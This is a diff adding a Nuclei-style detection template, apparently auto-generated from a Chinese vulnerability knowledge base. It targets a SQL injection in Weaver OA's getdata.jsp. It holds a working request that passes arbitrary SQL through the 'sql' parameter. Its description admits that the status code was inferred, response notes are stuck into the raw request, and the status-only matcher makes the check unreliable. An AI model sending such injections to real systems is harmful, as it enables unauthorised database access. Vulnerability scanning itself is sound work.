@@ -1,0 +1,36 @@
+id: poc-qgegs1r2swtiwde0
+info:
+  name: 泛微 OA getdata.jsp 注入
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qgegs1r2swtiwde0
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qgegs1r2swtiwde0
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%201234788999%20as%20id HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    1234788999
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
